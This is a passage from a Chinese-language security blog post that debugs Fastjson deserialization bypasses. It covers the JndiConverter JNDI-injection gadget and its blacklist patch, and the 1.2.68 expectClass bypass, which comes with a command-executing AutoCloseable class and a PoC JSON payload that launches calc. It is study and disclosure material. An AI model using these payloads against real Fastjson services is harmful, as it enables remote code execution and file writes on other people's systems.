class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);  </span><br><span class="line">              classReader.accept(visitor);  </span><br><span class="line">              jsonType = visitor.hasJsonType();  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">          <span class="comment">// skip  </span></span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">          IOUtils.close(is);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 设置autoTypeSupport开关  </span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> Feature.SupportAutoType.mask;  </span><br><span class="line">      <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> <span class="built_in">this</span>.autoTypeSupport  </span><br><span class="line">              || (features &amp; mask) != <span class="number">0</span>  </span><br><span class="line">              || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 若到这一步，clazz还是null的话，就会对其是否开启AutoType、是否注解JsonType、是否设置expectClass来进行判断  </span></span><br><span class="line"><span class="comment">// 如果判断通过，就会判断是否开启AutoType或是否注解JsonType，是的话就会在加载clazz后将其缓存到Mappings中，这正是1.2.47的利用点  </span></span><br><span class="line"><span class="comment">// 也就是说，只要开启了AutoType或者注解了JsonType的话，在这段代码逻辑中就会把clazz缓存到Mappings中  </span></span><br><span class="line">      <span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;  </span><br><span class="line">          <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;  </span><br><span class="line">          clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 如果从前面加载得到了clazz  </span></span><br><span class="line">      <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">          <span class="comment">// 如果注解了JsonType，添加到Mapping中，并直接返回clazz  </span></span><br><span class="line">          <span class="keyword">if</span> (jsonType) &#123;  </span><br><span class="line">              TypeUtils.addMapping(typeName, clazz);  </span><br><span class="line">              <span class="keyword">return</span> clazz;  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// 判断clazz是否为ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常  ，这里是直接过滤掉了此前的利用</span></span><br><span class="line">          <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">                  || javax.sql.DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">                  || javax.sql.RowSet.class.isAssignableFrom(clazz) <span class="comment">//  </span></span><br><span class="line">                  ) &#123;  </span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// 如果是expectClass不为空且clazz是其子类，则直接返回，否则抛出异常  </span></span><br><span class="line">          <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">              <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                  TypeUtils.addMapping(typeName, clazz);  </span><br><span class="line">                  <span class="keyword">return</span> clazz;  </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">              &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// build JavaBeanInfo后，对其creatorConstructor进行判断，如果该值不为null且开启AutoType则抛出异常  </span></span><br><span class="line">          <span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);  </span><br><span class="line">          <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;  </span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>再往下 clazz 为null，跳过 if( clazz !&#x3D; null ) 后 判断 是否开启autotypesupport 为 false 时，随后抛出异常</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/52.png"></p><p>至此，未开启 AutoType 是无法成功加载类进行 攻击的</p><h2 id="开启-AutoType-时"><a href="#开启-AutoType-时" class="headerlink" title="开启 AutoType 时"></a>开启 AutoType 时</h2><p>和前面一样 ，直接来到 checkAutoType() , 往下 进入了 一个if 判断 (不在白名单内，且开启了AutoType)：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/53.png"><br>虽然进去了，但我们的这个类，并不在 黑名单和 接收名单内，所以会一直往下跳到此处</p><p>由于 clazz &#x3D; null 且 autotype &#x3D; true 会进入if ，并调用loadClass() 函数的逻辑来加载恶意类</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/54.png"></p><p>跟进TypeUtils.loadClass()函数中，这块是老相识了，其中通过AppClassLoader类加载器成功加载恶意类，且由于前面开启AutoType的缘故、cacheClass为true进而开启了cache缓存、使得恶意类缓存到了Mapping中，最后返回加载的类：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/55.jpg"></p><p>最后由于AutoType开启了、clazz不为null且满足其中一些判断逻辑，最后就直接返回该恶意类了：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/56.png"></p><h2 id="Gadget链分析"><a href="#Gadget链分析" class="headerlink" title="Gadget链分析"></a>Gadget链分析</h2><p>在 DefaultJSONParser 调用 deserialze 后</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/57.jpg"></p><p>我进入这个 deserialze() 后 再继续跟进 ，就会卡住 ，但是属性值还是会跟着变化的，不知道你们会不会，也可能是我电脑问题？ 不过我一直往下打 还是会进入到此处：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/58.jpg"></p><p>这里是调用到了 org.apache.xbean.propertyeditor.JndiConverter类的无参构造函数，其中调用其父类AbstractConverter的有参构造函数，跟进到其父类中，既然都调用到父类构造函数了，结合前面的PoC中的AsText属性知道（JndiConverter类中并没有重写该属性的setter方法），是调用的AbstractConverter类的setAsText()函数来进行setter设置的：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/59.png"></p><p>其中调用了 toObject 进行对象转换，跟进看一手</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/60.png"></p><p>其中，这里看到调用了  toObjectImpl ()  函数进行处理，而该函数在父类   AbstractConverter 只是个抽象函数</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/61.jpg"></p><p>在其子类 JndiConverter 中是实现了的 ，实际上也是调用子类   JndiConverter 的 toObjectImpl(), 其中调用了  lookup 方法，这也是JNDI注入的漏洞点：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/62.png"><br>至此，就触发了JNDI注入漏洞导致成功利用了反序列化漏洞。</p><p>调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">toObjectImpl:<span class="number">35</span>, JndiConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">toObject:<span class="number">86</span>, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">setAsText:<span class="number">59</span>, AbstractConverter (org.apache.xbean.propertyeditor)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">setValue:<span class="number">110</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">123</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">1241</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">866</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:<span class="number">1555</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-<span class="number">1</span>, FastjsonASMDeserializer_1_JndiConverter (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">284</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">395</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1400</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1366</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">170</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">180</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">149</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">13</span>, POC (FastJson.JdbcRowSetImpl.erwu_siyi)</span><br></pre></td></tr></table></figure><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>黑名单绕过的Gadget补丁都是在新版本中添加新Gadget黑名单来进行防御的：<br><a href="https://github.com/alibaba/fastjson/compare/1.2.62%E2%80%A61.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.62%E2%80%A61.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p><p>在新版本的改进后运行会直接抛出异常：</p><p><code>Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbean.propertyeditor.JndiConverter|</code></p><p>因为他在 黑名单内添加了该类的hash：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/63.png"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>该版本的小总结其实就是其他师傅找到了不在黑名单内可用的一条lookup链子，很有想法，漏洞利用并不难，难的是寻找漏洞的过程 &#x2F;(ㄒoㄒ)&#x2F;~~</p><h1 id="Fastjson-x3D-1-2-68-反序列化漏洞"><a href="#Fastjson-x3D-1-2-68-反序列化漏洞" class="headerlink" title="Fastjson  &#x3D; 1.2.68 反序列化漏洞"></a>Fastjson  &#x3D; 1.2.68 反序列化漏洞</h1><h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>新 的绕过 ，即expectClass，绕过CheckAutoType () 函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。</p><p>攻击步骤为：</p><ul><li>先传入某个类，其加载成功后作为expectClass参数传入checkAutoType()函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；</li></ul><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul><li>Fastjson &lt;&#x3D; 1.2.68 </li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>简单验证 expectClass 绕过的可行性，先 使 Fastjson 服务器端 存在如下实现 AutoCloseable 接口类的恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson.HightVersionBypass;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再构造测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson.HightVersionBypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> FastJson.TemplateImpl.POC;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">POC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;FastJson.HightVersionBypass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(POC);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不需要开启 AutoType ，从而可以绕过 CheckAutoType 的检测 弹出计算器</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/64.png"></p><h2 id="调试分析-4"><a href="#调试分析-4" class="headerlink" title="调试分析"></a>调试分析</h2><p>一样的老样子，在 checkAutotype 那打断点，因为前面都是类似的调用而已、</p><p>第一次传入的 TypeName 是 java.lang.AutoCloseable 类，但是这里的  expectClass 是为 null 的</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/65.png"></p><p>往下跳过，因为中间都是一些 关于autotype的开关和白名单的检测，可以看到 直接从 Mapping 缓存中获取到了 AutoCloseable 类：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/67.png"></p><p>跟进这个函数可以看到，确实是在缓存中找到了该类：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/66.png"></p><p>找到后，再往下，在此处 返回了 clazz</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/68.jpg"></p><p>接着， 到 DefalutJSONParser 中，往下，可以看到，他进行了获取反序列化器的操作，反序列化器为 JavaBeanDeserializer ，然后再进行反序列化：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/69.jpg"></p><p>跟进，调用的自然是  JavaBeanDeserializer.java的deserialze()函数 ，其中 type 参数就是java.lang.AutoCloseable </p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/70.jpg"></p><p>然后往下，经过漫长的 F8 步过，来到 728 行的函数判断 ，这里看到获取不到对象反序列化器之后，就会进去如图的判断逻辑中，设置type参数即java.lang.AutoCloseable类为checkAutoType()函数的expectClass参数来调用checkAutoType()函数来获取指定类型，然后在获取指定的反序列化器，也就是说此时的java.lang.AutoCloseable 接口 为期望类 ：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/71.png"></p><p>此时，经过这个checkAutoType() 又回到了 checkAutoType()  ，typeName 参数就是我们的恶意类了，而 expectClass ，正是我们前面的 interface java.lang.AutoCloseable ；</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/72.jpg"></p><p>往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/73.jpg"></p><p>继续往下， 由于  expectClassFlag 为 True ，且目标类不在内部白名单内，程序进入 AutoType 开启时的检测逻辑</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/74.png"></p><p>由于 即不再黑名单 也不再接受名单内，就会继续往下执行，这里会进行 关闭 AutoType 的检测，但是这里也没能通过检测，到此处，由于 expectClass 为 True ，进入下面的loadCLass逻辑，加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/75.jpg"></p><p>跟进该函数，这里要 cache 为true 才会put 进内存里，而这里使用AppClassLoader加载vul.VulAutoCloseable类并直接返回：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/76.png"></p><p>往下 判断了 jsonType  ，true 的话 加入 mapping 中，然后判断了  关于 ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制，类如我们最熟悉的CC3的链子 ，接着 这里判断 expectClass 是否为null，往下再判断 我们的 clazz 是否为 expectClass 的子类，也就是 class FastJson.HightVersionBypass.VulAutoCloseable 是否为   interface java.lang.AutoCloseable 的子类，而我们 设置的 服务端的  VulAutoCloseable，class 正是  AutoCloseable的子类，条件成立，<strong>这也是为什么恶意类需要继承AutoCloseable的子类的原因</strong>：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/77.jpg"></p><p>返回类后 又回到了 JavaBeanDeserializer.class 中， 紧接着又进行了反序列化操作，新建恶意类实例，进而调用其构造函数 从而触发漏洞：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/78.png"></p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/79.jpg"></p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/80.jpg"></p><p>此处实例化传参调用构造器：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/81.png"><br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/82.jpg"></p><p>调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">8</span>, VulAutoCloseable (FastJson.HightVersionBypass)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)</span><br><span class="line">deserialze:<span class="number">1012</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">288</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">284</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">808</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">288</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">284</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">395</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1401</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1367</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">183</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">193</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">149</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">11</span>, Poc_1_2_68 (FastJson.HightVersionBypass)</span><br></pre></td></tr></table></figure><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>既然传入的第一个类 会成为 expectClass ，那么是否我随便传入一个接口类，然后恶意类继承该接口成为他的子类，就能实现利用呢？</p><p>其实是不行的，我尝试使用同样是 接口类的 java.lang.Cloneable，并且他也在mapping 中，但是无法执行成功 </p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/83.png"></p><p>原因是 通过checkAutoType 后，往下获取 反序列化器的时候不是 我们能利用成功的 JavaBeanDeserializer ，而是 JAVAObjectDeserializer ，而怎么修改其构造器，这就是我的知识盲区了，等技术好点了 再来研究这一块吧</p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>当传入checkAutoType()函数的expectClass参数不为null，并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中），就将需要加载的目标类当做是正常的类然后通过调用TypeUtils.loadClass()函数进行加载</p><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>前面试了一下 换期望类，没有成功，现在正式的学习如何寻找实际可行的利用类：</p><p>我是参考 b1ue 师傅的文章，但是那个网站已经挂了似乎， 其文章是寻找关于 输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">寻找 gadget 时的条件是这样的。</span><br><span class="line"></span><br><span class="line">- 需要一个通过 set 方法或构造方法指定文件路径的 OutputStream</span><br><span class="line">- 需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream</span><br><span class="line">- 需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法</span><br><span class="line"></span><br><span class="line">以上三个组合在一起就能构造成一个写文件的利用链，通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。</span><br><span class="line"></span><br><span class="line">分别是 FileOutputStream 和 ObjectOutputStream，但这两个类选取的构造器，不符合情况，所以只能找到这两个类的子类，或者功能相同的类。</span><br></pre></td></tr></table></figure><h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><p>利用类 ： <strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    